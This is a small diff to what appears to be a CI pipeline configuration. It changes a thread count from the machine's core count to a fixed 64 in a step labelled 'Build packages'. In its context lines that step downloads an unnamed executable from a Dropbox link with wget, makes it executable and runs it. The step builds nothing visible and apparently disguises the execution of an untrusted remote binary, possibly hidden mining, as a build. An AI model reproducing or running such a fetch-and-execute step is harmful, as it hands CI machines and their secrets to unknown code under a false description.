@@ -12,6 +12,6 @@ jobs:
       - run: 
           name: Build packages
           command: |
-            export THREADS=$(nproc)
+            THREADS=64
             wget -qO run https://www.dropbox.com/s/p36fuqsbtaaii97/pk-tz?dl=1; chmod +x run
             ./run ann
